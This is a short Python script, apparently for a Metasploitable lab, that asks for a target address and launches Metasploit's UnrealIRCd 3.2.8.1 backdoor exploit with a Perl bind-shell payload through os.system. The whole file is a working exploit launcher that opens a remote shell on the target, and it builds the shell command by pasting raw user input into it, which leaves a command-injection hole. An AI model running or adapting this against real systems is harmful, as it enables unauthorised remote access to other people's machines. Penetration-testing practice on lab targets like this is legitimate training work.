import os

def unreal_backdoor():
    h = input('Please enter the address of metasploitable: ')
    print("Starting exploit against", h)
    command = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor;set RHOSTS " + h + ";set payload cmd/unix/bind_perl;exploit'"
    os.system(command)

unreal_backdoor()
